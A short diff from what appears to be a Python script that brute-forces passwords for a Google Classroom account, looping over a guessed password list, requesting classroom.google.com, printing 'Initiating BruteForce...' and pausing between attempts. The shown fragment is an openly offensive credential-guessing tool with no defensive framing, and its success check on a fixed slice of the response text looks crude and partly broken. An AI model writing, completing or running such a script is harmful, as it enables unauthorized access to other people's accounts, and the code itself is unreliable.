@@ -49,7 +49,11 @@ except:         ##user doesn't input birthday
                 for x in range(0,10)
                 for y in range(0,10)]
 
+#For flavor :)
 
+print()
+print(email)
+print('Initiating BruteForce...')
 
 #Loop through passwords
     
@@ -59,7 +63,7 @@ for passwords in passwordList:
         corr = session.get('http://classroom.google.com')
         corr = str(corr)
         print(passwords)
-        if passwords in corr[944:989]:
+        if email in corr[944:989]:
             break
         time.sleep(60)
     except:
